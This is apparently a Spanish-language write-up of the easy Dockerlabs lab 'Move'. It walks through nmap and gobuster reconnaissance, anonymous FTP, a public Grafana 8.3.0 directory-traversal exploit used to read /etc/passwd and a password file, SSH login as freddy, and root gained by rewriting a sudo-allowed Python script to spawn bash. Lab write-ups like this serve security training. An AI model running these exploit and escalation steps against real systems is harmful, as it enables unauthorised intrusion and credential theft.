# Máquina Move

Dificultad -> Easy

Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)

## Reconocimiento

Comenzamos realizando un escaneo general con **nmap** sobre la IP de la máquina víctima para ver que puertos tiene abiertos.

```shell
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
________________________________________________
PORT     STATE SERVICE REASON
21/tcp   open  ftp     syn-ack
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
3000/tcp open  ppp     syn-ack
```

Lanzamos un conjunto de scripts predeterminado con **nmap** para que nos reporte más información relacionada a los puertos descubiertos en el anterior escaneo.

```shell
nmap -sCV -p21,22,80,3000 172.17.0.2 -oN targeted
________________________________________________
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    1 0        0              26 Mar 29 09:28 mantenimiento [NSE: writeable]
22/tcp   open  ssh     OpenSSH 9.6p1 Debian 4 (protocol 2.0)
| ssh-hostkey: 
|   256 770b3436870d386458c06f4ecd7a3a99 (ECDSA)
|_  256 1ec6b291563250a50345f3f732ca7bd6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.58 (Debian)
3000/tcp open  ppp?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 302 Found
```

El usuario **anonymous** está disponible en el servicio **ftp**, le echamos un vistazo.

```shell
ftp 172.17.0.2
-> anonymous
```

Vemos un directorio y dentro un archivo, asi que lo descargamos:

```shell
cd mantenimiento
get database.kdbx
```

Lo tratamos de abrir con **keepass2** pero tiene contraseña, por lo que trataremos de crackearla con **john**:

```shell
keepass2john database.kdbx
---------------------------------
! database.kdbx : File version '40000' is currently not supported!
```

Nos da error por la versión del archivo así que de momento pasaremos a inspeccionar otras vías.

Inspeccionamos la web del puerto 80, y encontramos la página por defecto de Apache.
Aplicamos **Fuzzing** sobre ella:

```shell
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x txt,php,html
```

Accedemos al archivo **maintenance.html** que hemos encontrado:

![Pasted image 20240428003510](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/f8a13e47-b465-4d7d-b4fd-f7012ba93901)

Le echamos un vistazo a la web que corre por el puerto 3000:

![Pasted image 20240428003758](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/1408ccac-184b-4aa6-bd31-6d885360a9cd)

```shell
whatweb http://172.17.0.2:3000/
------------------------------------------------------------------------------
http://172.17.0.2:3000/login [200 OK] Country[RESERVED][ZZ], Grafana[8.3.0], HTML5, IP[172.17.0.2], Script, Title[Grafana], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block]
```

--------------
## Explotación

Vemos que está utilizando **Grafana[8.3.0]**, con su versión. Podemos buscar algún exploit que podamos utilizar:

```shell
searchsploit Grafana
-----------------------------------------------
Grafana 7.0.1 - Denial of Service (PoC)
Grafana 8.3.0 - Directory Traversal and Arbitrary File Read                               multiple/webapps/50581.py
```

Vemos que hay uno justo para la versión correspondiente. Nos lo descargamos:

```shell
searchsploit -m multiple/webapps/50581.py
python3 50581.py -H http://172.17.0.2:3000
-> /etc/passwd
----------------------------------------------
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
ftp:x:101:104:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
grafana:x:103:105::/usr/share/grafana:/bin/false
freddy:x:1000:1000::/home/freddy:/bin/bash
```

Vemos un información interesante como un usuario **freddy**.
Leemos también el archivo que ponía en la web:

```shell
python3 50581.py -H http://172.17.0.2:3000
-> /tmp/pass.txt
-----------------------
t9sH76gpQ82UFeZ3GXZS
```

Usamos el usuario freddy y la contraseña obtenida para acceder por **ssh** -> **freddy:t9sH76gpQ82UFeZ3GXZS**

```ssh
ssh freddy@172.17.0.2
```

Estamos dentro !

------------
## Escalada de privilegios

Ejecutamos **sudo -l**, para ver si podemos ejecutar algo como root.

```shell
sudo -l
-----------------------
User freddy may run the following commands on 19cbc2280d8b:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/maintenance.py
```

Vemos que **/opt/maintenance.py** pertenece a freddy de forma que podemos cambiarlo y escribir en él.
El nuevo contenido del script **maintenance.py** será:

```python
import os
os.system("/usr/bin/python3 -c 'import os; os.system(\"/bin/bash\")'")
```

Lo ejecutamos:

```shell
sudo /usr/bin/python3 /opt/maintenance.py
```

```shell
whoami
----------------
root
```

Hemos conseguido el nivel de privilegios máximos en la máquina !
